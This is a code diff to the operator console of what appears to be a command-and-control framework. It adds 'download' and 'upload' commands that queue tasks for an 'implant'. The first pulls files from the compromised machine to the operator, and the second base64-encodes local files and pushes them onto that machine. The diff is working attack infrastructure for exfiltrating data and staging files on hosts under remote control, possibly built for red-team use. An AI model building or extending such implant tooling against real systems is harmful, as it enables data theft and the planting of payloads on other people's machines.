@@ -1,4 +1,6 @@
+import base64
 import datetime
+import os
 from typing import Any, List, Optional, Tuple
 from prompt_toolkit import print_formatted_text, HTML, PromptSession
 from prompt_toolkit.shortcuts import prompt
@@ -64,6 +66,10 @@ def handle(cmd: str, args: List[str], config: OperatorConfig, implant_id: str) -
         handle_result(config, args)
     elif cmd == "sleep":
         handle_sleep(config, implant_id, args)
+    elif cmd == "download":
+        handle_download(config, implant_id, args)
+    elif cmd == "upload":
+        handle_upload(config, implant_id, args)
     elif cmd == "back":
         return True
     elif cmd == "clear":
@@ -253,3 +259,40 @@ def handle_sleep(config: OperatorConfig, implant_id: str, args: List[str]) -> No
     seconds = args[0]
     logger.debug(f"Sending sleep task to {implant_id}")
     add_task(config, Opcodes.SLEEP.value, implant_id, int(seconds))
+
+def handle_download(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
+    """
+    Handle the download command, send a download task to the implant.
+    This task DOWNLOADs a file FROM the implant TO the operator/server
+    """
+    if len(args) < 1:
+        logger.error("Please provide a file path to download")
+        return
+
+    path = args[0]
+    logger.debug(f"Sending download task to {implant_id}")
+    add_task(config, Opcodes.DOWNLOAD.value, implant_id, path)
+
+def handle_upload(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
+    """
+    Handle the upload command, send an upload task to the implant
+    """
+    if len(args) < 2:
+        logger.error("Please provide a remote and local file path")
+        return
+
+    local_path = args[0]
+    remote_path = args[1]
+    
+    # See if file exists and is not a directory
+    if not os.path.isfile(local_path):
+        logger.error(f"File {local_path} does not exist")
+        return
+    
+    # Encode file contents as base64
+    with open(local_path, "rb") as f:
+        file_contents = base64.b64encode(f.read()).decode()
+    
+
+    logger.debug(f"Sending upload task to {implant_id}")
+    add_task(config, Opcodes.UPLOAD.value, implant_id, [remote_path, file_contents])
